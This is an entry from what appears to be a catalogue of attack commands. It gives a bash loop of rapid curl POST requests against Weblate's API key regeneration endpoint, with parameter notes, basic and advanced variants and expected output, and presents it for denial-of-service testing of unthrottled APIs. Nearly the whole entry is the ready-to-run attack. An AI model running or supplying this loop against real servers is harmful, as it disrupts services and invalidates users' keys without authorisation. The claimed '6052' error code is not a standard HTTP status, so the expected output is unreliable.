---
id: cmd-curl-rapid-regenerate-001
data: >-
  for i in {1..30}; do curl -X POST
  https://target-weblate.com/api/user/keys/regenerate/ -H "Authorization: Token
  YOUR_API_TOKEN" -d "{}"; done
tags:
  - dos
  - api
type: command
output: Multiple JSON successes followed by error 6052
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:32:10.083Z'
verified: false
validated: true
submitted: true
---
# curl-rapid-regenerate

## Command

```bash
for i in {1..30}; do curl -X POST https://target-weblate.com/api/user/keys/regenerate/ -H "Authorization: Token YOUR_API_TOKEN" -d "{}"; done
```

## Description

This bash loop uses curl to send 30 rapid POST requests to Weblate's API key regeneration endpoint, exploiting no rate limits to cause server errors. Use in DoS testing on unthrottled APIs.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `for i in {1..30}` | Loop 30 times | Yes |
| `curl -X POST` | POST method for regeneration | Yes |
| `https://target-weblate.com/api/user/keys/regenerate/` | Target endpoint | Yes |
| `-H "Authorization: Token YOUR_API_TOKEN"` | Auth header | Yes |
| `-d "{}" ` | Empty payload for trigger | Yes |

## Examples

### Basic Usage

```bash
for i in {1..30}; do curl -X POST https://target-weblate.com/api/user/keys/regenerate/ -H "Authorization: Token abc123" -d "{}"; done
```

### Advanced Usage

```bash
for i in {1..50}; do curl -X POST https://target-weblate.com/api/user/keys/regenerate/ -H "Authorization: Token abc123" -d "{}" -w "%{http_code}\n"; done
```

## Expected Output

Series of 200 OK with new keys, then 6052 errors after ~30 requests, indicating overload.

## Related

- [[Related Procedure: Exploit-Weblate-Rate-Limiting-Deficiency-with-Rapid-Requests]]
